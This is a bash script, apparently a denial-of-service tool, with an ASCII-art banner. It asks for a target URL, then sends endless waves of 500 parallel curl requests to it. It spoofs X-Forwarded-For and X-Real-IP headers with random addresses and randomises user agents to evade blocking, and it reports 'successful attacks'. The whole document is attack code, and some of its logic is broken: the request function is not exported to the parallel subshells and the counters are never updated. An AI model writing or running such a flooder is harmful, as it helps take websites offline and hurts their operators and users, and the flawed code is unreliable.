#!/bin/bash

# Variables
URL=""
SUCCESS_COUNT=0
FAILURE_COUNT=0
THREADS=500  # Number of parallel processes

# Colors for text
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
CYAN="\e[36m"
NC="\e[0m"  # No color

# Clear the terminal and print the header in ASCII art
clear
echo -e "${CYAN}██████╗ ███████╗    ███████╗"
echo -e "${CYAN}██╔══██╗██╔════╝    ██╔════╝"
echo -e "${CYAN}██████╔╝█████╗      █████╗  "
echo -e "${CYAN}██╔═══╝ ██╔══╝      ██╔══╝  "
echo -e "${CYAN}██║     ███████╗    ██║     "
echo -e "${CYAN}╚═╝     ╚══════╝    ╚═╝     "
echo -e "${GREEN}██████╗ ███████╗    ███████╗"
echo -e "${GREEN}╚════██╗██╔════╝    ██╔════╝"
echo -e "${GREEN} █████╔╝█████╗      █████╗  "
echo -e "${GREEN}██╔═══╝ ██╔══╝      ██╔══╝  "
echo -e "${GREEN}███████╗███████╗    ██║     "
echo -e "${GREEN}╚══════╝╚══════╝    ╚═╝     "
echo -e "${YELLOW}-------------------------------------------------${NC}"
echo -e "${YELLOW}          Developed by @A_Y_TR                  ${NC}"
echo -e "${YELLOW}-------------------------------------------------${NC}"
echo

# Input target URL
echo -e "${YELLOW}Enter the target URL: ${NC}"
read -r URL
echo

# Function to generate a random IP address
generate_random_ip() {
    echo "$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256))"
}

# Function to send an HTTP request
send_request() {
    local RANDOM_IP
    RANDOM_IP=$(generate_random_ip)
    local USER_AGENT
    USER_AGENT="Mozilla/5.0 (Linux; Android $(shuf -i 4-12 -n 1)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/$(shuf -i 70-100 -n 1).0.$(shuf -i 1000-4000 -n 1).$(shuf -i 50-150 -n 1) Mobile Safari/537.36"

    # Send the request using curl
    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" -H "User-Agent: $USER_AGENT" -H "X-Forwarded-For: $RANDOM_IP" -H "X-Real-IP: $RANDOM_IP" "$URL")
    
    if [[ "$RESPONSE" == "200" ]]; then
        ((SUCCESS_COUNT++))
    else
        ((FAILURE_COUNT++))
    fi
}

# Start the attack with parallel processes
start_attack() {
    while :; do
        seq 1 $THREADS | xargs -P $THREADS -I {} bash -c 'send_request'
    done
}

# Display attack statistics including success rate
print_stats() {
    while :; do
        # Calculate success rate
        if ((SUCCESS_COUNT + FAILURE_COUNT > 0)); then
            SUCCESS_RATE=$((SUCCESS_COUNT * 100 / (SUCCESS_COUNT + FAILURE_COUNT)))
        else
            SUCCESS_RATE=0
        fi
        echo -e "${GREEN}Successful Attacks: ${SUCCESS_COUNT} - Failed Attacks: ${FAILURE_COUNT}"
        echo -e "${YELLOW}Success Rate: ${SUCCESS_RATE}%${NC}"
        sleep 2
    done
}

# Start the attack and print statistics
start_attack &
print_stats
